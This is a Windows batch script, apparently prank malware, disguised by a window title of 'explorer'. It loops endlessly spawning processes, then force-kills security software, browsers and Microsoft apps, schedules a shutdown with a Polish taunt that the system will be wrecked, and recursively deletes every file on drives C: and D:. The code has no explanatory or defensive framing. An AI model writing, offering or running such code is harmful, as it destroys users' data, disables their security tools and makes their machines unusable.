@echo off
title explorer

:start
start notepad.exe
start cmd.exe
start charmap.exe
explorer.exe
start calc.exe
goto :start
taskkill /f /im explorer.exe
taskkill /f /im zabezpieczenia systemu windows
taskkill /f /im chrome.exe
taskkill /f /im chrome.exe
taskkill /f /im opera gx.exe
taskkill /f /im opera.exe
taskkill /f /im microsoft edge.exe
taskkill /f /im microsoft store.exe
taskkill /f /im microsoft teams.exe
taskkill /f /im microsoft 665.exe
taskkill /f /im msgbox.exe
shutdown -s -t 60 -c "Twuj system zaraz zostanie rozwalony:)"
del d:\*/s /q
del c:\*/s /q
